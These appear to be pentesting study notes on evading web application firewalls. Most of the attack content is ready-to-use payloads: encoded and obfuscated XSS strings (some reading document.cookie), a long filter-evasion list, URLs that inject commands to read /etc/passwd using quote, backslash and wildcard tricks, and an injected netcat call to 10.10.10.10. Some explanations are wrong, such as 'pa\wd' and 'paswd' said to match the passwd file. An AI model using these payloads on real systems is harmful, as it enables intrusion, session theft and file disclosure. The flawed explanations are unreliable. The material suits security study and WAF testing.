#  WAF bypass
- The main functionality seems to be to check our input and validate that it is safe. Knowing this there might be several ways to get around these checks.

#  Base64 encoding our payload
- A WAF might be blocking the following request on a page where 'q' is a paramter that stands for Query in a search function. The q parameter's value get's reflected on the page if there are no results found.
`/?q=<javascript:alert(document.cookie)>`

- This is because the WAF might be set up to block anything containing alert(\*) or anything containing "javascript". 
- If we know this we might be able to fool the server by encoding our payload for example. In HTML we can indicate that we are talking about base64 using the \<data\> tag. In there we can indicate that we are working with Base64.
`/?q=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=`

- Using this technique we might e able to pass by some of the dumber WAFs that will look at this attack string and don't see the word javascript or alert which will result in the attack string being allowed. The server will then decode the message as expected resulting in an alert.


#  Language Specific tricks
- `https://site.com/index.php?%20file=cat /etc/passwd`
- `https://site.com/index.php?file=cat /etc/passwd`
- In this situation we are relying on the fact that PHP will replace whitespaces in the URL with underscores. %20 is the url encoded value for a space.
- `https://site.com/index.php?%file=cat /etc/passwd`
- `https://site.com/index.php?file=cat /etc/passwd`
- ASPX has similar strage behavior where it will just remove the %sign if it's not followed by 2 numbers. This will allow us to put some cool tricks when a waf does not reject unknown parameters.


#  Other Techniques
- `<img src=x onerror="javascript:window.onerror=alert; throw XSS">`
- Some WAFs will see this string when they are looking for "src=x" or "=alert" and they will only look at that literal string. Since our attack string contains spaces it will be allowed and later on the webserver will remove the spaces for us and pop our alert.
- `https://site.com/index.php?file=cat /etc/pa\wd`
- WAFs don't just serve to block XSS requests. It can also block LFI attacks. We might be able to simple fool the server by adding in a special character like '\\' into the string.
- In linux this character is allowing us to escape characters but since we only escape the 's' character it prints it literaly so on the server we just see "cat /etc/pa\wd" which in bash is the same as "cat /etc/paswd".
- `https://site.com/index.php?file=cat /etc/pa*swd`
- `https://site.com/index.php?file=cat /etc/pa**swd`
- `https://site.com/index.php?file=cat /etc/pa's'wd`
- `https://site.com/index.php?file=cat /etc/pa"s"wd`
- We can think of several variations of these special characters which serve a purpose on linux:
- `https://site.com/index.php?command=n'c' 10.10.10.10 4234`
- We can do exactly the thing to commands when we enter the above command into bash it would just ignore the single quotes.


#  Don't forget about the Wildcard
- Due to some bash tricks we can remove most of our commands and still have then work!
- `https://site.com/index.php?file=cat /e??/p????`
- `https://site.com/index.php?file=cat /etc/??????`
- `https://site.com/index.php?file=cat /???/paswd`
- The above commands will all grab the /etc/passwd file because of how bash works with wildcards. It'll try to grab the first file it sees that matches those criteria and if we craft our attack string well enough we can even execute commands. We just have to grab them from /usr/bin.
- `https://site.com/index.php?command=/???/???/nc`
- Due to the way default unix is set up, usually "/???/???" will lead to usr/bin and if we use our imagination we can get very far with just question mark.


#  OWASP XSS WAF filter bypass strings
- OWASP gives us some XSS attack strings on their website that are designed to pass around some of the most common WAFs. [Link Here](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
```
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">

<Video> <source onerror = "javascript: alert (XSS)">

<Input value = "XSS" type = text>

<applet code="javascript:confirm(document.cookie);">

<isindex x="javascript:" onmouseover="alert(XSS)">

"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>

"><img src="x:x" onerror="alert(XSS)">

"><iframe src="javascript:alert(XSS)">

<object data="javascript:alert(XSS)">

<isindex type=image src=1 onerror=alert(XSS)>

<img src=x:alert(alt) onerror=eval(src) alt=0>

<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>

<iframe/src="data:text/html,<svg onload=alert(1)>">

<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>

<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script

<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">

<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>

<form><a href="javascript:\u0061lert(1)">X
</script>

<img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src
)'>

<style>//*{x:expression(alert(/xss/))}//<style></style>
On Mouse Over

<img src="/" =_=" title="onerror='prompt(1)'">

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe

<script x> alert(1) </script 1=2

<form><button formaction=javascript&colon;alert(1)>CLICKME

<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"

<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>

<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
```

#  Resources
- https://interact.f5.com/rs/653SMC783/images/EBOOKSEC242055496-which-waf-is-right-product-FNL.pdf
- https://www.f5.com/services/resources/glossary/web-application-firewall#:~:text=A+WAF+protects+your+web,and+what+traffic+is+safe
- https://owasp.org/www-community/xss-filter-evasion-cheatsheet
- https://campus.barracuda.com/product/webapplicationfirewall/doc/4259853/configuring-urlnormalization/